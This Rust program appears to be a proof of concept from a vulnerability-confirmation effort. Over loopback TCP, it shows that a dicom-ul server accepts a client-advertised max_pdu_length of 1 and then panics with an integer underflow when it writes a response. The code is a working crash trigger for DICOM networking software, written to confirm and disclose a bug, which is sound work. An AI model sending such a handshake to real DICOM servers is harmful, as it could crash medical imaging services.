// Real, two-real-participant, real-loopback-TCP reproduction (per CONFIRMATION.md section 11).
//
// Both participants are built entirely on `dicom-ul`'s own real, public association API - no
// hand-crafted PDU bytes anywhere. A real client (`ClientAssociationOptions`) connects to a real
// server (`ServerAssociationOptions`) over a real TCP loopback socket, and genuinely advertises
// a tiny `max_pdu_length` (1) in its real, wire-encoded A-ASSOCIATE-RQ. The real server accepts
// this (candidate 072's bug: no lower bound is enforced on the peer-advertised value) and later
// calls its own real `send_pdata()` to write a real response - which underflows internally.
use dicom_ul::{ClientAssociationOptions, ServerAssociationOptions};
use std::net::TcpListener;
use std::thread;

fn main() {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();

    let server = thread::spawn(move || -> bool {
        let (socket, _) = listener.accept().unwrap();
        let options = ServerAssociationOptions::new()
            .accept_any()
            .with_transfer_syntax("1.2.840.10008.1.2")
            .with_transfer_syntax("1.2.840.10008.1.2.1")
            .promiscuous(true);
        let mut association = options
            .establish(socket)
            .expect("real server negotiation failed");
        println!("server: real association established (peer advertised a tiny max_pdu_length)");

        let pc_id = association.presentation_contexts()[0].id;

        // Did the write PANIC (the bug) or just return an ordinary Err/Ok (no bug,
        // regardless of what caused any such Err - e.g. the client disconnecting for
        // its own unrelated reasons, since it declared an equally tiny value for its
        // own receiving side too, which is a separate, pre-existing, unrelated guard).
        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            use std::io::Write;
            let mut pdata = association.send_pdata(pc_id);
            println!("server: writing a real response through the real PDataWriter...");
            let _ = pdata.write_all(&vec![0x41u8; 64]);
            let _ = pdata.finish();
        }));

        match result {
            Ok(()) => {
                println!("server: no panic (write completed or failed gracefully)");
                false
            }
            Err(payload) => {
                let msg = payload
                    .downcast_ref::<String>()
                    .cloned()
                    .or_else(|| payload.downcast_ref::<&str>().map(|s| s.to_string()))
                    .unwrap_or_default();
                println!("server: PANICKED: {msg}");
                msg.contains("attempt to subtract with overflow")
            }
        }
    });

    let client = ClientAssociationOptions::new()
        .with_abstract_syntax("1.2.840.10008.1.1")
        .calling_ae_title("TESTCALLER")
        // advertise a tiny max_pdu_length in the real A-ASSOCIATE-RQ - genuinely sent
        // over the wire to the real server above
        .max_pdu_length(1);
    let _ = client.establish(("127.0.0.1", port));
    println!(
        "client: done (its own subsequent read may fail due to its own tiny declared \
         max_pdu_length - irrelevant to the server-side bug being tested)"
    );

    let bug_reproduced = server.join().unwrap();
    if bug_reproduced {
        eprintln!("BUG REPRODUCED: server panicked with the exact underflow message");
        std::process::exit(1);
    } else {
        println!("no underflow panic observed");
        std::process::exit(0);
    }
}
